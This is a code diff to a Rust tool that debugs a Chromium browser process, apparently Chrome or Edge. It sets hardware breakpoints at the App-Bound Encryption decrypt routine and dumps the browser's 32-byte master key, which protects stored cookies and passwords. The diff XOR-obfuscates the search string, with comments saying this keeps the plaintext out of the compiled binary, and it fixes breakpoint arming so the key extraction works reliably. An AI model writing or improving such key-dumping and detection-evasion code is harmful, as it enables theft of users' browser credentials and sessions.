@@ -15,18 +15,43 @@ use crate::mem;
 use crate::pe;
 use crate::process;
 
-/// The browser's own ABE code references this static string right where it
-/// returns the decrypted key; we locate the reference from .rdata via an XREF
-/// scan, exactly like the original tool.
-const DECRYPT_RESULT_CODE: &[u8] = b"OSCrypt.AppBoundProvider.Decrypt.ResultCode\x00";
+const ANCHOR_KEY: u8 = 0x5A;
+const ANCHOR_ENC: [u8; 44] = [
+    0x15, 0x09, 0x19, 0x28, 0x23, 0x2a, 0x2e, 0x74, 0x1b, 0x2a, 0x2a, 0x18,
+    0x35, 0x2f, 0x34, 0x3e, 0x0a, 0x28, 0x35, 0x2c, 0x33, 0x3e, 0x3f, 0x28,
+    0x74, 0x1e, 0x3f, 0x39, 0x28, 0x23, 0x2a, 0x2e, 0x74, 0x08, 0x3f, 0x29,
+    0x2f, 0x36, 0x2e, 0x19, 0x35, 0x3e, 0x3f, 0x5a,
+];
+
+fn anchor_key() -> u8 {
+    // Route the key through a runtime pointer load (black-boxed) so the
+    // compiler cannot constant-fold the whole transform and re-emit the
+    // plaintext anchor in .rdata.
+    let key: [u8; 1] = [ANCHOR_KEY];
+    let p = std::hint::black_box(&key[0] as *const u8);
+    unsafe { *p }
+}
+
+fn decrypt_anchor() -> Vec<u8> {
+    let key = anchor_key();
+    ANCHOR_ENC.iter().map(|b| b ^ key).collect()
+}
 const KEY_LEN: usize = 32;
 const DEBUG_EVENT_WAIT_MS: u32 = 500;
 
+/// On x64, Get/SetThreadContext require the CONTEXT buffer to be 16-byte
+/// aligned (the C header uses __declspec(align(16)), which the windows crate
+/// does not carry over; without this wrapper every call fails with
+/// ERROR_INVALID_PARAMETER).
+#[repr(C, align(16))]
+struct AlignedContext(CONTEXT);
+
 fn set_hw_breakpoint(hthread: HANDLE, addr: usize, clear: bool) -> bool {
-    let mut ctx: CONTEXT = unsafe { zeroed() };
+    let mut aligned = AlignedContext(unsafe { zeroed() });
+    let ctx = &mut aligned.0;
     ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS_AMD64;
-    if unsafe { GetThreadContext(hthread, &mut ctx) }.is_err() {
-        eprintln!("[-] GetThreadContext failed");
+    if let Err(e) = unsafe { GetThreadContext(hthread, ctx) } {
+        eprintln!("[-] GetThreadContext failed: {e}");
         return false;
     }
     if clear {
@@ -40,24 +65,31 @@ fn set_hw_breakpoint(hthread: HANDLE, addr: usize, clear: bool) -> bool {
         ctx.Dr7 |= 1;
         ctx.Dr6 = 0;
     }
-    unsafe { SetThreadContext(hthread, &ctx) }.is_ok()
+    if let Err(e) = unsafe { SetThreadContext(hthread, ctx) } {
+        eprintln!("[-] SetThreadContext failed: {e}");
+        return false;
+    }
+    true
 }
 
-fn arm_thread(hthread: HANDLE, addr: usize, clear: bool) {
+fn arm_thread(hthread: HANDLE, addr: usize, clear: bool) -> bool {
     if unsafe { SuspendThread(hthread) } == u32::MAX {
         eprintln!("[-] SuspendThread failed");
-        return;
+        return false;
     }
-    set_hw_breakpoint(hthread, addr, clear);
+    let armed = set_hw_breakpoint(hthread, addr, clear);
     unsafe { ResumeThread(hthread) };
+    armed
 }
 
+/// Returns the number of threads the breakpoint was actually set on.
 fn arm_all_threads(pid: u32, addr: usize, clear: bool) -> usize {
     let mut armed = 0;
     for tid in process::threads_of(pid) {
         if let Ok(hthread) = unsafe { OpenThread(THREAD_ALL_ACCESS, false, tid) } {
-            arm_thread(hthread, addr, clear);
-            armed += 1;
+            if arm_thread(hthread, addr, clear) {
+                armed += 1;
+            }
             unsafe { let _ = CloseHandle(hthread); };
         }
     }
@@ -90,9 +122,10 @@ fn dll_name(hprocess: HANDLE, load: &LOAD_DLL_DEBUG_INFO) -> Option<String> {
 
 fn dump_key(hprocess: HANDLE, tid: u32, edge: bool) -> Option<[u8; KEY_LEN]> {
     let hthread = unsafe { OpenThread(THREAD_ALL_ACCESS, false, tid) }.ok()?;
-    let mut ctx: CONTEXT = unsafe { zeroed() };
+    let mut aligned = AlignedContext(unsafe { zeroed() });
+    let ctx = &mut aligned.0;
     ctx.ContextFlags = CONTEXT_INTEGER_AMD64 | CONTEXT_CONTROL_AMD64;
-    unsafe { GetThreadContext(hthread, &mut ctx) }.ok()?;
+    unsafe { GetThreadContext(hthread, ctx) }.ok()?;
     println!(
         "[+] Hardware breakpoint hit on thread {tid}, RIP = {:#x}",
         ctx.Rip
@@ -115,7 +148,8 @@ fn dump_key(hprocess: HANDLE, tid: u32, edge: bool) -> Option<[u8; KEY_LEN]> {
 }
 
 fn locate_breakpoint(hprocess: HANDLE, base: usize) -> Option<usize> {
-    let string_va = pe::find_pattern(hprocess, base, DECRYPT_RESULT_CODE)?;
+    let anchor = decrypt_anchor();
+    let string_va = pe::find_pattern(hprocess, base, &anchor)?;
     pe::find_lea_xref(hprocess, base, string_va)
 }
 
@@ -170,8 +204,11 @@ pub fn run(hprocess: HANDLE, pid: u32, target_module: &str, edge: bool) -> Optio
                             println!("[*] {target_module} loaded at {base:#x}");
                             match locate_breakpoint(hprocess, base) {
                                 Some(bp) => {
+                                    let total = process::threads_of(pid).len();
                                     let armed = arm_all_threads(pid, bp, false);
-                                    println!("[*] Hardware breakpoint armed on {armed} threads");
+                                    println!(
+                                        "[*] Hardware breakpoint armed on {armed}/{total} threads"
+                                    );
                                     breakpoint = Some(bp);
                                 }
                                 None => eprintln!(
